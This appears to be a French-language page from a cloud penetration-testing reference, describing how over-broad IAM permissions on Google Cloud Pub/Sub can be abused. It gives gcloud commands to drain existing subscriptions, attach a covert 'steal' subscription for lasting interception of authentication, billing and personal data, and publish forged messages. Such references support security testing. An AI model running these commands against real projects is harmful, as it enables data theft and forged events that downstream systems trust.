---
title: "Pub/Sub : capturer et injecter des messages de sujet"
order: 1
description: "Lire ou publier sur des sujets et abonnements Pub/Sub via un IAM étendu pour capturer ou injecter des messages."
keywords:
  - Pub/Sub
  - sujet
  - abonnement
  - IAM pubsub
  - message
---

# Pub/Sub

Pub/Sub transporte des données d'événements entre les services, de sorte qu'un IAM qui vous permet de lire un abonnement ou d'en créer un sur un sujet devient une prise de données, et les droits de publication vous permettent d'injecter des messages auxquels les systèmes en aval font confiance. Les permissions à rechercher sont `pubsub.subscriptions.consume`, `pubsub.topics.attachSubscription` et `pubsub.topics.publish`.

## Siphonner un sujet

```bash
gcloud pubsub topics list
gcloud pubsub subscriptions list

# pull from an existing subscription
gcloud pubsub subscriptions pull <sub> --auto-ack --limit 100

# or attach your own subscription to a topic and drain it
gcloud pubsub subscriptions create steal --topic <topic>
gcloud pubsub subscriptions pull steal --auto-ack --limit 100
```

## Injecter des messages

```bash
gcloud pubsub topics publish <topic> --message '{"forged":"event"}'
```

## Notes d'exploitation

- Créer un nouvel abonnement sur un sujet est une prise discrète et durable : elle continue de recevoir chaque message jusqu'à sa suppression.
- Les sujets portent souvent des événements applicatifs sensibles (authentification, facturation, données personnelles), de sorte qu'un abonnement vidé est un vol de données direct.
- Les messages injectés sont traités avec la confiance que le consommateur place dans le sujet, un chemin vers un abus en aval.

## Outils

- **gcloud** (`pubsub subscriptions pull`, `topics publish`).

## Références

- [HackTricks Cloud : GCP Pub/Sub](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud : GCP](https://hackingthe.cloud/)
- [Google : contrôle d'accès Pub/Sub](https://cloud.google.com/pubsub/docs/access-control)
